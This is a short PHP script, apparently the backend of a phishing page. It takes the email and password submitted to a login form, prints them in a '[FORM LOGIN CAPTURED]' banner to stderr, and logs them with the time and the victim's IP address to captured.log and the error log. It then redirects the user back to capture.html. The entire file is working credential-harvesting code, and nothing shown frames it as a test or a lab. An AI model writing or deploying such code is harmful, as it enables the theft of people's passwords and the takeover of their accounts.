<?php
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    header('Location: capture.html');
    exit;
}

$email = trim($_POST['email'] ?? '');
$password = $_POST['password'] ?? '';
$remoteIp = $_SERVER['REMOTE_ADDR'] ?? 'unknown';

// Write captured credentials to stderr when available
$stderr = fopen('php://stderr', 'w');
if ($stderr) {
    fprintf($stderr, "\n╔════════════════════════════════════════════════════════════╗\n");
    fprintf($stderr, "║ [FORM LOGIN CAPTURED]                                      ║\n");
    fprintf($stderr, "║ Email: %s\n", str_pad($email, 50));
    fprintf($stderr, "║ Password: %s\n", str_pad($password, 44));
    fprintf($stderr, "║ Time: %s\n", date('Y-m-d H:i:s'));
    fprintf($stderr, "║ IP: %s\n", str_pad($remoteIp, 49));
    fprintf($stderr, "╚════════════════════════════════════════════════════════════╝\n\n");
    fclose($stderr);
} else {
    error_log(sprintf('[FORM LOGIN CAPTURED] Email: %s | Password: %s | IP: %s', $email, $password, $remoteIp));
}

$logEntry = sprintf(
    "[%s] FORM LOGIN | IP: %s | Email: %s | Password: %s\n",
    date('Y-m-d H:i:s'),
    $remoteIp,
    $email,
    $password
);
file_put_contents(__DIR__ . '/captured.log', $logEntry, FILE_APPEND | LOCK_EX);
error_log($logEntry);

header('Location: capture.html');
exit;
